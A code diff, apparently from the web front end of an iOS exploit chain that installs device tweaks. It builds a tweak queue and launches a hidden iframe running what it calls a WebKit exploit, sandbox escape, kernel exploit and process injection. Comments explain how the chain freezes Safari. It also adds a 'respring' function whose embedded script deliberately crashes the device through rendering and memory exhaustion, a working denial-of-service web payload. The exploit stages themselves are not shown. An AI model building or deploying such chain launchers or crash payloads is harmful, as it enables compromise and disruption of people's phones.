-      if (detail) {
-        if (expanded) detail.removeAttribute('hidden');
-        else detail.setAttribute('hidden', '');
+      // Sync queue button state
+      var btn = el.querySelector('.tweak-queue-btn[data-cb="' + row.cbId + '"]');
+      if (btn) {
+        if (cb.disabled) { btn.textContent = 'DEV'; btn.classList.remove('queued'); return; }
+        if (cb.checked) { btn.textContent = 'QUEUED'; btn.classList.add('queued'); }
+        else { btn.textContent = 'GET'; btn.classList.remove('queued'); }
       }
-      var title = el.querySelector('.tweak-row-title');
-      if (title) title.setAttribute('aria-expanded', expanded ? 'true' : 'false');
     }
+    // Sheet names for each tweak row
+    var tweakSheetNames = {
+      tweakRowFiveicon: 'SBCustomizer',
+      tweakRowPowercuff: 'Powercuff',
+      tweakRowMgpatcher: 'MobileGestalt Patcher',
+      tweakRowApplimit: '3-App Limit Bypass'
+    };
+    var _sheetSourceRow = null;
+    var _sheetChanged = false;
+    function openTweakSheet(rowId) {
+      var row = document.getElementById(rowId);
+      if (!row) return;
+      _sheetChanged = false;
+      var detail = row.querySelector('.tweak-row-detail');
+      var options = row.querySelector('.tweak-row-options');
+      var body = document.getElementById('tweakSheetBody');
+      body.innerHTML = '';
+      if (detail) { var clone = detail.cloneNode(false); clone.removeAttribute('hidden'); body.appendChild(detail); detail.removeAttribute('hidden'); }
+      if (options) body.appendChild(options);
+      _sheetSourceRow = row;
+      document.getElementById('tweakSheetTitle').textContent = tweakSheetNames[rowId] || '';
+      document.getElementById('tweakSheetBackdrop').classList.add('active');
+      document.getElementById('tweakSheet').classList.add('active');
+    }
+    // Track any input changes inside the sheet
+    document.getElementById('tweakSheet').addEventListener('change', function() { _sheetChanged = true; });
+    document.getElementById('tweakSheet').addEventListener('input', function() { _sheetChanged = true; });
+    function closeTweakSheet() {
+      // Auto-queue the tweak if the user changed any setting
+      if (_sheetChanged && _sheetSourceRow) {
+        var rowId = _sheetSourceRow.id;
+        for (var ri = 0; ri < tweakRows.length; ri++) {
+          if (tweakRows[ri].rowId === rowId) {
+            var cb = document.getElementById(tweakRows[ri].cbId);
+            if (cb && !cb.disabled && !cb.checked) {
+              cb.checked = true;
+              cb.dispatchEvent(new Event('change'));
+              syncTweakRow(tweakRows[ri]);
+            }
+            break;
+          }
+        }
+      }
+      _sheetChanged = false;
+      document.getElementById('tweakSheetBackdrop').classList.remove('active');
+      document.getElementById('tweakSheet').classList.remove('active');
+      // Move content back to source row after transition
+      setTimeout(function() {
+        if (!_sheetSourceRow) return;
+        var body = document.getElementById('tweakSheetBody');
+        while (body.firstChild) _sheetSourceRow.appendChild(body.firstChild);
+        // Re-hide detail
+        var detail = _sheetSourceRow.querySelector('.tweak-row-detail');
+        if (detail) detail.setAttribute('hidden', '');
+        _sheetSourceRow = null;
+      }, 320);
+    }
+    document.getElementById('tweakSheetBack').addEventListener('click', closeTweakSheet);
+    document.getElementById('tweakSheetBackdrop').addEventListener('click', closeTweakSheet);
+
+    // Clear all queued tweaks
+    document.getElementById('clearQueueBtn').addEventListener('click', function() {
+      if (!confirm('Clear all queued tweaks?')) return;
+      for (var ci = 0; ci < tweakRows.length; ci++) {
+        var cb = document.getElementById(tweakRows[ci].cbId);
+        if (cb && cb.checked) {
+          cb.checked = false;
+          cb.dispatchEvent(new Event('change'));
+        }
+        syncTweakRow(tweakRows[ci]);
+      }
+    });
+
     for (var ti = 0; ti < tweakRows.length; ti++) {
       (function(row) {
         var cb = document.getElementById(row.cbId);
@@ -1594,31 +2498,60 @@
           syncTweakRow(row);
         }
         var el = document.getElementById(row.rowId);
-        var title = el && el.querySelector('.tweak-row-title');
-        if (title) {
-          title.addEventListener('click', function(e) {
+        if (el) {
+          el.addEventListener('click', function(e) {
+            // Don't open sheet if clicking the queue button
+            if (e.target.closest('.tweak-queue-btn')) return;
+            if (cb && cb.disabled) return;
             e.preventDefault();
-            toggleTweakDetail(row.rowId);
+            openTweakSheet(row.rowId);
           });
         }
       })(tweakRows[ti]);
     }
 
-    // Keep clicks on the inline options (level select) from also toggling the
-    // parent checkbox label.
-    var pcOptionsWrap = document.querySelector('#tweakRowPowercuff .tweak-row-options');
-    if (pcOptionsWrap) {
-      pcOptionsWrap.addEventListener('click', function(e) { e.stopPropagation(); });
-      pcOptionsWrap.addEventListener('change', function(e) { e.stopPropagation(); });
-    }
-    var sbcOptionsWrap = document.querySelector('#tweakRowFiveicon .tweak-row-options');
-    if (sbcOptionsWrap) {
-      sbcOptionsWrap.addEventListener('click', function(e) { e.stopPropagation(); });
-    }
-    var taOptionsWrap = document.querySelector('#tweakRowThreeapp .tweak-row-options');
-    if (taOptionsWrap) {
-      taOptionsWrap.addEventListener('click', function(e) { e.stopPropagation(); });
-    }
+    // Wire queue buttons: toggle hidden checkbox + update button text/style
+    document.querySelectorAll('.tweak-queue-btn[data-cb]').forEach(function(btn) {
+      var cbId = btn.getAttribute('data-cb');
+      var cb = document.getElementById(cbId);
+      if (!cb) return;
+      if (cb.disabled) return;
+      function syncBtn() {
+        if (cb.checked) { btn.textContent = 'QUEUED'; btn.classList.add('queued'); }
+        else { btn.textContent = 'GET'; btn.classList.remove('queued'); }
+      }
+      btn.addEventListener('click', function(e) {
+        e.stopPropagation();
+        // Block queueing if user hasn't adjusted settings from defaults
+        if (!cb.checked) {
+          if (cbId === 'tweakFiveicon') {
+            var di = parseInt((document.getElementById('sbcDockIcons') || {}).value, 10) || 4;
+            var hc = parseInt((document.getElementById('sbcHsCols') || {}).value, 10) || 4;
+            var hr = parseInt((document.getElementById('sbcHsRows') || {}).value, 10) || 6;
+            var hl = !!(document.getElementById('sbcHideLabels') || {}).checked;
+            if (di === 4 && hc === 4 && hr === 6 && !hl) {
+              alert('Adjust at least one setting first (dock icons, columns, rows, or hide labels). Tap the row to open options.');
+              return;
+            }
+          }
+          if (cbId === 'tweakMgpatcher') {
+            var mgCbIds = ['mgBootChime','mgChargeLimit','mgTapToWake','mgCollisionSOS','mgPencil','mgActionButton','mgAOD','mgStageManager','mgInternalInstall','mgSRD','mgShutter','mgiPadApps'];
+            var anyChecked = false;
+            for (var mi = 0; mi < mgCbIds.length; mi++) {
+              if ((document.getElementById(mgCbIds[mi]) || {}).checked) { anyChecked = true; break; }
+            }
+            if (!anyChecked) {
+              if (!confirm('No flags checked. All patched MobileGestalt keys will be removed so the device queries real hardware values. Respring to apply.')) return;
+            }
+          }
+        }
+        cb.checked = !cb.checked;
+        cb.dispatchEvent(new Event('change'));
+        syncBtn();
+      });
+      syncBtn();
+      cb.addEventListener('change', syncBtn);
+    });
     // Slider binding: keep the display value in sync with the native range
     // input, live while dragging. The count constants are used by both the
     // initial wiring and the reset handler so they stay in one place.
@@ -1652,8 +2585,6 @@
         });
         var hideLabelsEl = document.getElementById('sbcHideLabels');
         if (hideLabelsEl) hideLabelsEl.checked = false;
-        var statbarEl = document.getElementById('sbcStatbar');
-        if (statbarEl) statbarEl.checked = false;
         lsSaveState();
       });
     }
@@ -1661,43 +2592,30 @@
     // Persist UI selections across Safari kills via localStorage so the
     // user's toggles/steppers don't reset every time they relaunch.
     var LS_STATE_KEY = 'ls_ui_state_v1';
-    var LS_SBX0_FALLBACK_KEY = 'ls_sbx0_fallback_start_v1';
-    var LS_SBX0_FALLBACK_COUNT = 4;
-    function lsClampSbx0FallbackIndex(raw) {
-      var n = parseInt(raw, 10);
-      if (!isFinite(n)) n = 0;
-      n %= LS_SBX0_FALLBACK_COUNT;
-      if (n < 0) n += LS_SBX0_FALLBACK_COUNT;
-      return n;
-    }
-    function lsGetSbx0FallbackIndex() {
-      try {
-        return lsClampSbx0FallbackIndex(localStorage.getItem(LS_SBX0_FALLBACK_KEY));
-      } catch (e) {}
-      return 0;
-    }
-    function lsSetSbx0FallbackIndex(idx) {
-      try {
-        localStorage.setItem(LS_SBX0_FALLBACK_KEY, String(lsClampSbx0FallbackIndex(idx)));
-      } catch (e) {}
-    }
-    function lsTakeSbx0FallbackIndex() {
-      var idx = lsGetSbx0FallbackIndex();
-      lsSetSbx0FallbackIndex(idx + 1);
-      return idx;
-    }
     function lsSaveState() {
       try {
         var state = {
           fiveicon: !!document.getElementById('tweakFiveicon').checked,
           powercuff: !!document.getElementById('tweakPowercuff').checked,
-          threeapp: !!document.getElementById('tweakThreeapp').checked,
           powercuffLevel: (document.getElementById('powercuffLevel') || {}).value || 'heavy',
           dockIcons: parseInt((document.getElementById('sbcDockIcons') || {}).value, 10) || 4,
           hsCols: parseInt((document.getElementById('sbcHsCols') || {}).value, 10) || 4,
           hsRows: parseInt((document.getElementById('sbcHsRows') || {}).value, 10) || 6,
           hideLabels: !!(document.getElementById('sbcHideLabels') || {}).checked,
-          statbar: !!(document.getElementById('sbcStatbar') || {}).checked
+          mgpatcher: !!document.getElementById('tweakMgpatcher').checked,
+          applimit: false,
+          mgBootChime: !!(document.getElementById('mgBootChime') || {}).checked,
+          mgChargeLimit: !!(document.getElementById('mgChargeLimit') || {}).checked,
+          mgTapToWake: !!(document.getElementById('mgTapToWake') || {}).checked,
+          mgCollisionSOS: !!(document.getElementById('mgCollisionSOS') || {}).checked,
+          mgPencil: !!(document.getElementById('mgPencil') || {}).checked,
+          mgActionButton: !!(document.getElementById('mgActionButton') || {}).checked,
+          mgAOD: !!(document.getElementById('mgAOD') || {}).checked,
+          mgStageManager: !!(document.getElementById('mgStageManager') || {}).checked,
+          mgInternalInstall: !!(document.getElementById('mgInternalInstall') || {}).checked,
+          mgSRD: !!(document.getElementById('mgSRD') || {}).checked,
+          mgShutter: !!(document.getElementById('mgShutter') || {}).checked,
+          mgiPadApps: !!(document.getElementById('mgiPadApps') || {}).checked
         };
         localStorage.setItem(LS_STATE_KEY, JSON.stringify(state));
       } catch (e) {}
@@ -1710,11 +2628,15 @@
         if (!s) return;
         if (typeof s.fiveicon === 'boolean') document.getElementById('tweakFiveicon').checked = s.fiveicon;
         if (typeof s.powercuff === 'boolean') document.getElementById('tweakPowercuff').checked = s.powercuff;
-        if (typeof s.threeapp === 'boolean') document.getElementById('tweakThreeapp').checked = s.threeapp;
         var hlEl = document.getElementById('sbcHideLabels');
         if (hlEl && typeof s.hideLabels === 'boolean') hlEl.checked = s.hideLabels;
-        var statbarEl = document.getElementById('sbcStatbar');
-        if (statbarEl && typeof s.statbar === 'boolean') statbarEl.checked = s.statbar;
+        if (typeof s.mgpatcher === 'boolean') document.getElementById('tweakMgpatcher').checked = s.mgpatcher;
+        document.getElementById('tweakApplimit').checked = false;
+        var mgCbIds = ['mgBootChime','mgChargeLimit','mgTapToWake','mgCollisionSOS','mgPencil','mgActionButton','mgAOD','mgStageManager','mgInternalInstall','mgSRD','mgShutter','mgiPadApps'];
+        for (var mgi = 0; mgi < mgCbIds.length; mgi++) {
+          var mgEl = document.getElementById(mgCbIds[mgi]);
+          if (mgEl && typeof s[mgCbIds[mgi]] === 'boolean') mgEl.checked = s[mgCbIds[mgi]];
+        }
         // Programmatic .checked = ... does not fire 'change', so manually
         // re-run the same row-sync logic that runs on a real toggle so the
         // tweak row visually matches its checked state (options panel
@@ -1741,7 +2663,14 @@
       } catch (e) {}
     }
     lsLoadState();
-    ['tweakFiveicon','tweakPowercuff','tweakThreeapp','powercuffLevel','sbcHideLabels','sbcStatbar'].forEach(function(id) {
+
+    // Auto-show kill Safari prompt if a previous chain run left dirty state
+    try {
+      if (sessionStorage.getItem('ls_running')) {
+        showKillSafari();
+      }
+    } catch(e) {}
+    ['tweakFiveicon','tweakPowercuff','powercuffLevel','sbcHideLabels','tweakMgpatcher','tweakApplimit','mgBootChime','mgChargeLimit','mgTapToWake','mgCollisionSOS','mgPencil','mgActionButton','mgAOD','mgStageManager','mgInternalInstall','mgSRD','mgShutter','mgiPadApps'].forEach(function(id) {
       var el = document.getElementById(id);
       if (el) el.addEventListener('change', lsSaveState);
     });
@@ -1767,7 +2696,7 @@
       var tweaks = [];
       for (var i = 0; i < tweakRows.length; i++) {
         var cb = document.getElementById(tweakRows[i].cbId);
-        if (cb && cb.checked) tweaks.push(tweakRows[i].name);
+        if (cb && !cb.disabled && cb.checked) tweaks.push(tweakRows[i].name);
       }
       var levelSel = document.getElementById('powercuffLevel');
       var level = levelSel ? levelSel.value : 'heavy';
@@ -1775,28 +2704,46 @@
         dock_icons: sbcClampInput('sbcDockIcons', 4, 7, 4),
         hs_cols: sbcClampInput('sbcHsCols', 3, 7, 4),
         hs_rows: sbcClampInput('sbcHsRows', 4, 8, 6),
-        hide_labels: !!(document.getElementById('sbcHideLabels') || {}).checked ? 1 : 0,
-        statbar: !!(document.getElementById('sbcStatbar') || {}).checked ? 1 : 0
+        hide_labels: !!(document.getElementById('sbcHideLabels') || {}).checked ? 1 : 0
       };
-      return { tweaks: tweaks, level: level, sbc: sbc };
+      var mgFlags = [];
+      var mgUnflags = [];
+      var mgIds = ['mgBootChime','mgChargeLimit','mgTapToWake','mgCollisionSOS','mgPencil','mgActionButton','mgAOD','mgStageManager','mgInternalInstall','mgSRD','mgShutter','mgiPadApps'];
+      for (var mi = 0; mi < mgIds.length; mi++) {
+        var mgCb = document.getElementById(mgIds[mi]);
+        var fname = mgIds[mi].replace('mg','').toLowerCase();
+        if (mgCb && mgCb.checked) mgFlags.push(fname);
+        else mgUnflags.push(fname);
+      }
+      return { tweaks: tweaks, level: level, sbc: sbc, mg_flags: mgFlags.join(','), mg_unflags: mgUnflags.join(',') };
     }
 
-    function markDone() {
+    function markDone(message) {
       if (doneSignal) return;
       doneSignal = true;
-      stopSyslogPolling();
-      try { localStorage.setItem(LOG_ACTIVE_KEY, '0'); } catch(e) {}
+      stopLogWatchdog();
+      logAppend(message || 'Install complete!', 'ok');
+      var stageBanner = document.getElementById('logStageBanner');
+      var stageText = document.getElementById('logStageText');
+      var stageSub = document.getElementById('logStageSub');
+      if (stageBanner) {
+        stageBanner.classList.remove('err');
+        stageBanner.classList.add('done');
+      }
+      if (stageText) stageText.textContent = message ? 'Check result' : 'Install complete';
+      if (stageSub) stageSub.textContent = message ? 'Safari returned after the expected run window' : 'All tweaks applied successfully';
+      markAllPhasesDone();
       try { sessionStorage.removeItem('ls_running'); } catch(e) {}
-      try { sessionStorage.setItem(USERLAND_DIRTY_KEY, 'success'); } catch(e) {}
+      try { localStorage.setItem(RAW_LOG_ACTIVE_KEY, '0'); } catch(e) {}
       var installStatusEl = document.getElementById('installStatus');
       if (installStatusEl) {
+        installStatusEl.className = 'install-status';
         installStatusEl.textContent = '';
-        installStatusEl.classList.remove('error');
         installStatusEl.dataset.sbxDone = '';
       }
       var btn = document.getElementById('runBtn');
       if (btn) {
-        btn.textContent = 'Installed';
+        btn.textContent = message ? 'Check Result' : 'Installed';
         btn.className = 'btn btn-done';
       }
     }
@@ -1804,15 +2751,17 @@
     function markFailed(message) {
       if (doneSignal) return;
       doneSignal = true;
+      stopLogWatchdog();
+      var text = message || 'Exploit failed. Force-quit Safari and try again.';
+      logAppend(text, 'err');
+      setStageError('Install failed');
       try { sessionStorage.removeItem('ls_running'); } catch(e) {}
-      try { sessionStorage.setItem(USERLAND_DIRTY_KEY, 'failed'); } catch(e) {}
-      try { localStorage.setItem(LOG_ACTIVE_KEY, '0'); } catch(e) {}
-      stopSyslogPolling();
+      try { localStorage.setItem(RAW_LOG_ACTIVE_KEY, '1'); } catch(e) {}
       var installStatusEl = document.getElementById('installStatus');
       if (installStatusEl) {
-        installStatusEl.classList.add('error');
+        installStatusEl.className = 'install-status error';
         installStatusEl.dataset.sbxDone = '';
-        installStatusEl.textContent = message || 'Exploit failed. Force-quit Safari and try again.';
+        installStatusEl.textContent = text;
       }
       var btn = document.getElementById('runBtn');
       if (btn && canRun) {
@@ -1822,54 +2771,80 @@
     }
 
     function handleProgressLog(text) {
-      if (!text || typeof text !== 'string') return false;
-      var msg = text.toLowerCase();
-      var el = document.getElementById('installStatus');
-      if (msg.indexOf('sbx0: [+] sbx0 complete') !== -1) {
-        chainReachedSbx0 = true;
-        lsSetSbx0FallbackIndex(currentSbx0FallbackStart);
-        if (el && el.dataset.sbxDone !== '1') {
-          el.dataset.sbxDone = '1';
-          el.classList.remove('error');
-          el.textContent = 'SBX0 complete. SBX1/nativefcall is running; Safari may freeze here.';
-        }
-        return true;
+      if (!text || typeof text !== 'string') return;
+      lastLogText = text;
+      lastLogTime = Date.now();
+      watchdogTicks = 0;
+      rawLogAppend(text, classifyRawLogLine(text));
+      updateStage(text);
+      // Error detection - show errors in the log since the user needs to see them
+      var lower = text.toLowerCase();
+      if ((lower.indexOf('error') !== -1 || lower.indexOf('exception') !== -1 || lower.indexOf('fetch failed') !== -1) && lower.indexOf('reporterror') === -1) {
+        logAppend('Error: ' + text.replace(/^\[[^\]]*\]\s*/, ''), 'err');
+        setStageError('Error encountered');
       }
-      if (msg.indexOf('[sbx1] stage 5 started') !== -1 || msg.indexOf('entering sbx1sbx1()') !== -1) {
-        chainReachedSbx1 = true;
-        if (el) {
-          el.classList.remove('error');
-          el.textContent = 'SBX1 started. Waiting for nativefcall bootstrap and PE handoff.';
-        }
-        return true;
-      }
-      if (msg.indexOf('spawning pe') !== -1 || msg.indexOf('pe_main.js execution started') !== -1 || msg.indexOf('[mpd] pe spawned') !== -1) {
-        chainReachedPeHandoff = true;
-        if (el) {
-          el.classList.remove('error');
-          el.textContent = 'PE payload handed off. Wait for SpringBoard / selected tweak effect.';
-        }
-        return true;
-      }
-      return false;
     }
 
-    var chainSawActivity = false;
-    var chainReachedSbx0 = false;
-    var chainReachedSbx1 = false;
-    var chainReachedPeHandoff = false;
-    var currentSbx0FallbackStart = 0;
     window.addEventListener('message', function(event) {
       var data = event.data || {};
       if (data.type === 'lightsaber_done') markDone();
-      if (data.type === 'lightsaber_error') markFailed(data.text);
-      if (data.type === 'lightsaber_failed') markFailed(data.reason || data.text);
-      if (data.type === 'lightsaber_log') {
-        chainSawActivity = true;
-        logAppend('[' + (data.source || 'webcontent') + '] ' + data.text, data.reportError ? 'err' : classifyLogLine(data.text));
-        handleProgressLog(data.text);
-      }
+      if (data.type === 'lightsaber_failed' || data.type === 'lightsaber_error') markFailed(data.reason || data.text);
+      if (data.type === 'lightsaber_log') handleProgressLog(data.text);
     });
+
+    function isIPhoneUserAgent() {
+      return /\biPhone\b/i.test(navigator.userAgent || '');
+    }
+
+    function initRespringButton() {
+      var btn = document.getElementById('respringBtn');
+      if (!btn) return;
+      if (!isIPhoneUserAgent()) {
+        btn.disabled = true;
+        btn.setAttribute('aria-disabled', 'true');
+        btn.title = 'Respring is only available on iPhone';
+      }
+    }
+
+    function runRespring() {
+      if (!isIPhoneUserAgent()) return;
+      if (!confirm('Are you sure you want to respring?')) return;
+      var statusEl = document.getElementById('installStatus');
+      if (statusEl) {
+        statusEl.className = 'install-status';
+        statusEl.textContent = 'Respringing...';
+      }
+      try {
+        var oldFrame = document.getElementById('respringFrame');
+        if (oldFrame && oldFrame.parentNode) oldFrame.parentNode.removeChild(oldFrame);
+      } catch(e) {}
+
+      var frame = document.createElement('iframe');
+      frame.id = 'respringFrame';
+      frame.className = 'respring-frame';
+      frame.setAttribute('sandbox', 'allow-forms allow-modals allow-scripts allow-same-origin');
+      frame.srcdoc = [
+        '<!doctype html><html><body style="margin:0;overflow:hidden;">',
+        '<script>',
+        'var container=document.createElement("div");',
+        'container.style.cssText="perspective:1px;perspective-origin:9999999% 9999999%;";',
+        'document.body.appendChild(container);',
+        'for(var i=0;i<500;i++){',
+        'var d=document.createElement("div");',
+        'd.style.cssText="position:absolute;width:100vw;height:100vh;backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);transform:translate3d(100000px,100000px,"+i+"px) rotateY(90deg);opacity:0.99;";',
+        'container.appendChild(d);',
+        '}',
+        'setInterval(function(){',
+        'try{navigator.share({title:"R",text:"R".repeat(100000)});}catch(e){}',
+        'var x=new Uint8Array(1024*1024*20);',
+        'crypto.getRandomValues(x);',
+        '},0);',
+        '<\/script>',
+        '</body></html>'
+      ].join('');
+      document.body.appendChild(frame);
+    }
+    initRespringButton();
 
     function confirmInstall() {
       if (!canRun) return;
@@ -1877,13 +2852,13 @@
       var statusEl = document.getElementById('installStatus');
       if (sel.tweaks.length === 0) {
         if (statusEl) {
-          statusEl.classList.add('error');
+          statusEl.className = 'install-status error';
           statusEl.textContent = 'Select at least one tweak to install.';
         }
         return;
       }
       if (statusEl) {
-        statusEl.classList.remove('error');
+        statusEl.className = 'install-status';
         statusEl.textContent = '';
       }
       // If a previous chain run left ls_running set, Safari is in a dirty
@@ -1892,11 +2867,14 @@
       // to the kill-safari prompt - that's the only useful action available.
       try {
         if (sessionStorage.getItem('ls_running')) {
-          showKillSafari('running');
+          showKillSafari();
           return;
         }
-        if (sessionStorage.getItem(USERLAND_DIRTY_KEY)) {
-          showKillSafari(sessionStorage.getItem(USERLAND_DIRTY_KEY));
+      } catch(e) {}
+      try {
+        if (localStorage.getItem('ls_confirmed_once')) {
+          var sel2 = gatherSelection();
+          runExploit(sel2.tweaks, sel2.level, sel2.sbc, sel2.mg_flags, sel2.mg_unflags);
           return;
         }
       } catch(e) {}
@@ -1909,25 +2887,16 @@
 
     function proceedInstall() {
       document.getElementById('confirmOverlay').className = 'overlay';
+      try { localStorage.setItem('ls_confirmed_once', '1'); } catch(e) {}
       var sel = gatherSelection();
-      runExploit(sel.tweaks, sel.level, sel.sbc);
+      runExploit(sel.tweaks, sel.level, sel.sbc, sel.mg_flags, sel.mg_unflags);
     }
 
-    function showKillSafari(reason) {
+    function showKillSafari() {
       var btn = document.getElementById('runBtn');
       if (btn && canRun) {
         btn.className = 'btn btn-run';
         btn.textContent = 'Install Selected';
-      }
-      var message = document.getElementById('killSafariMessage');
-      if (message) {
-        if (reason === 'success') {
-          message.textContent = 'The chain already ran in this Safari/WebContent lifetime. Reusing the same userland process is much less reproducible than a fresh launch. From the app switcher, swipe up on Safari to kill the process, then reopen and try again.';
-        } else if (reason === 'running') {
-          message.textContent = 'Safari still has a chain run marked active from this userland session. From the app switcher, swipe up on Safari to kill the process, then reopen and try again.';
-        } else {
-          message.textContent = 'Safari got corrupted during a recent chain run. Reusing the same userland process can make the next attempt much less reproducible. From the app switcher, swipe up on Safari to kill the process, then reopen and try again.';
-        }
       }
       document.getElementById('killSafariOverlay').className = 'overlay active';
     }
@@ -1936,98 +2905,80 @@
       document.getElementById('killSafariOverlay').className = 'overlay';
     }
 
-    function removeExploitFrames() {
-      var frames = document.querySelectorAll('iframe');
-      for (var i = 0; i < frames.length; i++) {
-        var frame = frames[i];
-        var src = '';
-        try { src = frame.getAttribute('src') || ''; } catch(e) {}
-        if (src.indexOf('frame.html') === -1 && !(frame.dataset && frame.dataset.bbExploitFrame === '1')) continue;
-        try { frame.src = 'about:blank'; } catch(e) {}
-        try {
-          if (frame.parentNode) frame.parentNode.removeChild(frame);
-        } catch(e) {}
-      }
-    }
-
-    function softResetUserlandSession() {
-      doneSignal = true;
-      stopSyslogPolling();
-      removeExploitFrames();
-      try { window.stop(); } catch(e) {}
-      try {
-        sessionStorage.removeItem('ls_running');
-        sessionStorage.removeItem(USERLAND_DIRTY_KEY);
-      } catch(e) {}
-      try {
-        localStorage.setItem(LOG_ACTIVE_KEY, '0');
-        localStorage.removeItem(LOG_STORE_KEY);
-      } catch(e) {}
-      var url = new URL(window.location.href);
-      url.searchParams.set('soft_reset', String(Date.now()));
-      window.location.replace(url.toString());
-    }
-
-    function runExploit(tweaks, level, sbc) {
+    function runExploit(tweaks, level, sbc, mg_flags, mg_unflags) {
       if (!canRun) return;
-      if (!tweaks) tweaks = [];
+      if (!tweaks || tweaks.length === 0) tweaks = ['fiveicon'];
       level = level || 'heavy';
       sbc = sbc || { dock_icons: 4, hs_cols: 4, hs_rows: 6, hide_labels: 0 };
+      mg_flags = mg_flags || '';
+      mg_unflags = mg_unflags || '';
       var installStatusEl = document.getElementById('installStatus');
       try {
         if (sessionStorage.getItem('ls_running')) {
           if (installStatusEl) {
-            installStatusEl.classList.remove('error');
+            installStatusEl.className = 'install-status';
             installStatusEl.textContent = '';
           }
-          showKillSafari('running');
-          return;
-        }
-        if (sessionStorage.getItem(USERLAND_DIRTY_KEY)) {
-          if (installStatusEl) {
-            installStatusEl.classList.remove('error');
-            installStatusEl.textContent = '';
-          }
-          showKillSafari(sessionStorage.getItem(USERLAND_DIRTY_KEY));
+          showKillSafari();
           return;
         }
       } catch(e) {}
-      try { sessionStorage.setItem(USERLAND_DIRTY_KEY, 'running'); } catch(e) {}
       doneSignal = false;
-      chainSawActivity = false;
-      chainReachedSbx0 = false;
-      chainReachedSbx1 = false;
-      chainReachedPeHandoff = false;
-      currentSbx0FallbackStart = lsTakeSbx0FallbackIndex();
       if (installStatusEl) {
-        installStatusEl.classList.remove('error');
-        installStatusEl.textContent = 'WebKit exploit \u2192 sandbox escape \u2192 kernel exploit \u2192 process injection is underway\u2026';
+        // This block is the one bit of running-state copy guaranteed to
+        // paint before the WebKit freeze, so it has to carry the freeze
+        // warning itself — the in-log Expected callout may not get a chance
+        // to render once fcall hits. The styled .running card (pulsing dot,
+        // bold title, muted subtitle) makes the line the primary attention
+        // anchor while the chain works.
+        installStatusEl.className = 'install-status running';
+        installStatusEl.innerHTML =
+          '<span class="install-status-dot"></span>' +
+          '<span class="install-status-body">' +
+            '<span class="install-status-title">Running exploit chain &mdash; about 1 minute</span>' +
+            '<span class="install-status-meta">Page will freeze. Don’t switch apps or lock the phone.</span>' +
+          '</span>';
       }
       var btn = document.getElementById('runBtn');
       if (btn) {
         btn.className = 'btn btn-disabled';
         btn.textContent = 'Installing...';
       }
-      // Set the progress line SYNCHRONOUSLY before the iframe is created.
+      // Set the progress card SYNCHRONOUSLY before the iframe is created.
       // iOS Safari shares one WebContent process across the parent page and
       // its iframes, so once the exploit kicks in and the iframe's JS main
       // thread stalls during the fcall / sbx0 / sbx1 phase, the PARENT's
       // main thread also stops servicing the runloop - no setTimeout, no
       // rAF, no postMessage handler, nothing fires until the chain either
-      // completes or crashes Safari. The only text that's guaranteed to
-      // stay on screen during the freeze is text we write right now, in
+      // completes or crashes Safari. The only DOM that's guaranteed to
+      // stay on screen during the freeze is what we write right now, in
       // this synchronous code path, before the iframe exists.
       if (installStatusEl) {
-        installStatusEl.classList.remove('error');
         installStatusEl.dataset.sbxDone = '';
       }
 
-      var lb = document.getElementById('logBox');
-      clearLogView();
-      try { localStorage.setItem(LOG_ACTIVE_KEY, '1'); } catch(e) {}
-      if (lb) lb.className = 'active';
-      logAppend('[UI] Worker log bridge armed', 'ok');
-      logAppend('[UI] Starting WebContent iframe with sbx0FallbackStart=' + currentSbx0FallbackStart, 'device');
+      clearRawLogView(true);
+      try { localStorage.setItem(RAW_LOG_ACTIVE_KEY, '1'); } catch(e) {}
+      currentStage = 'start';
+      currentStageName = 'Starting';
+      resetPhases();
+      resetExpectations();
+      var stageBanner = document.getElementById('logStageBanner');
+      var stageText = document.getElementById('logStageText');
+      var stageSub = document.getElementById('logStageSub');
+      if (stageBanner) { stageBanner.classList.remove('done'); stageBanner.classList.remove('err'); }
+      if (stageText) stageText.textContent = 'Starting exploit chain';
+      if (stageSub) stageSub.textContent = 'Loading components...';
+      // Hide the static "What to expect" panel during a run — the phase
+      // strip and Expected callout cover that information in-context.
+      var runExpEl = document.getElementById('runExpectations');
+      if (runExpEl) runExpEl.classList.add('hidden');
+      var tweakDisplayNames = { fiveicon: 'SBCustomizer', powercuff: 'Powercuff', mgpatcher: 'MobileGestalt Patcher', applimit: '3-App Limit Bypass' };
+      var displayTweaks = tweaks.map(function(t) { return tweakDisplayNames[t] || t; });
+      rawLogAppend('[UI] WebContent log armed', 'ok');
+      logAppend('Starting install with: ' + displayTweaks.join(', '), 'ok');
+      startLogWatchdog();
+      scrollToLog();
 
       // Match the upstream DarkSword install button: just a 60-second
       // setTimeout fallback plus a postMessage listener for the iframe's
@@ -2036,25 +2987,8 @@
       // reliable across versions, and the upstream chain expects the user to
       // notice that "Safari froze/crashed/reloaded means it worked" anyway.
       setTimeout(function() {
-        if (doneSignal) return;
-        if (chainReachedPeHandoff) {
-          markDone();
-          return;
-        }
-        if (chainReachedSbx1) {
-          markFailed('Timed out after SBX1 started, before PE handoff was confirmed. Force-quit Safari and try again.');
-          return;
-        }
-        if (chainReachedSbx0) {
-          markFailed('Timed out after SBX0 completed, before SBX1/PE handoff was confirmed. Force-quit Safari and try again.');
-          return;
-        }
-        if (chainSawActivity) {
-          markFailed('Timed out before sandbox escape completed. Force-quit Safari and try again.');
-          return;
-        }
-        markFailed('Timed out \u2014 no response from exploit. Force-quit Safari and try again.');
-      }, 60000);
+        markDone('Expected run window elapsed. If Safari froze and crashed to the home screen, wait a few seconds and check the home screen for your tweaks.');
+      }, 90000);
 
       // Force a layout flush on the status + button text writes above so
       // the browser sees them as committed style changes before we yield.
@@ -2082,18 +3016,15 @@
         var sbcParams = '&dock_icons=' + encodeURIComponent(sbc.dock_icons)
           + '&hs_cols=' + encodeURIComponent(sbc.hs_cols)
           + '&hs_rows=' + encodeURIComponent(sbc.hs_rows)
-          + '&hide_labels=' + encodeURIComponent(sbc.hide_labels || 0)
-          + '&statbar=' + encodeURIComponent(sbc.statbar || 0)
-          + '&sbx0_fallback_start=' + encodeURIComponent(currentSbx0FallbackStart);
+          + '&hide_labels=' + encodeURIComponent(sbc.hide_labels || 0);
         var frame = document.createElement('iframe');
-        frame.src = 'frame.html?tweaks=' + encodedTweaks + '&level=' + encodeURIComponent(level) + sbcParams + '&_=' + Math.random();
+        frame.src = 'frame.html?tweaks=' + encodedTweaks + '&level=' + encodeURIComponent(level) + sbcParams + '&mg_flags=' + encodeURIComponent(mg_flags) + '&mg_unflags=' + encodeURIComponent(mg_unflags) + '&_=' + Math.random();
         frame.style.width = '1px';
         frame.style.height = '1px';
